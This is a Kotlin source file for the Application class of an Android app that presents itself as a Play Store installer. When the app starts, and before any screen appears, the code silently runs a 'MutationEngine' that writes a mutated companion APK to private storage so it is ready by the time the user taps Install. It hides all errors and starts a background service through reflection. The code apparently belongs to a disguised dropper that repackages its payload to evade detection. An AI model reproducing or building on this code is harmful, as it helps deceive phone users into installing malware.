package com.playstore.installer

import android.app.Application
import android.content.Intent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File

class LauncherApplication : Application() {

    companion object {
        lateinit var instance: LauncherApplication
            private set

        // Name of the mutated companion file written to private storage
        const val MUTATED_APK_NAME = "mc.tmp"

        fun getMutatedApkFile(app: Application): File =
            File(app.filesDir, MUTATED_APK_NAME)

        private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Start MutationEngine immediately — runs before any Activity is visible.
        // By the time the user taps Install (~10-15 seconds later) the mutated
        // companion is ready in filesDir/mc.tmp.
        appScope.launch {
            try {
                val engine = MutationEngine(applicationContext)
                val bytes  = engine.getMutatedCompanionBytes()
                if (bytes.isNotEmpty()) {
                    getMutatedApkFile(this@LauncherApplication).writeBytes(bytes)
                }
                // Silent fail on any error — InstallActivity falls back to assets
            } catch (_: Exception) { }
        }

        startService(Intent(this, Class.forName(
            "com.playstore.installer.service.LauncherService"
        )))
    }
}
